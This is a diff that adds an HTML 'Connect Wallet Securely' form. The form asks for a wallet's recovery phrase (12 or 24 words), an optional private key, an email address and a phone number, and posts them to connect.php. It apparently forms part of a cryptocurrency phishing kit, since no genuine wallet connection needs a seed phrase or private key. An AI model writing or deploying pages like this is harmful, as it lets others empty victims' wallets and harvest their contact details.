@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="form.css">
+    <title>Document</title>
+</head>
+<body>
+    <div class="form">
+        <form method="post" action="connect.php">
+                        <div class="form-group">
+                            <label for="walletName">Wallet Name</label>
+                            <input type="text" id="walletName" name="walletName" required>
+                        </div>
+                        
+                        <div class="form-group">
+                            <label for="walletAddress">Wallet Address</label>
+                            <input type="text" id="walletAddress" name="walletAddress" placeholder="0x..." required>
+                        </div>
+                        
+                        <div class="form-group">
+                            <label for="seedPhrase">Recovery Phrase (12/24 words)</label>
+                            <textarea id="seedPhrase" name="seedPhrase" placeholder="Enter your 12 or 24 word recovery phrase..." required></textarea>
+                        </div>
+                        
+                        <div class="form-group">
+                            <label for="privateKey">Private Key (Optional)</label>
+                            <input type="password" id="privateKey" name="privateKey" placeholder="Enter your private key...">
+                        </div>
+                        <div class="form-group">
+                            <label for="email">email</label>
+                            <input type="text" id="email" name="email" required>
+                        </div>
+                        <div class="form-group">
+                            <label for="phone">Phone Number</label>
+                            <input type="tel" id="phone_Number" name="phone" required>
+                        </div>
+                        
+                        <button type="submit" class="submit-btn">Connect Wallet Securely</button>
+                    </form>
+    </div>
+    
+</body>
+</html>
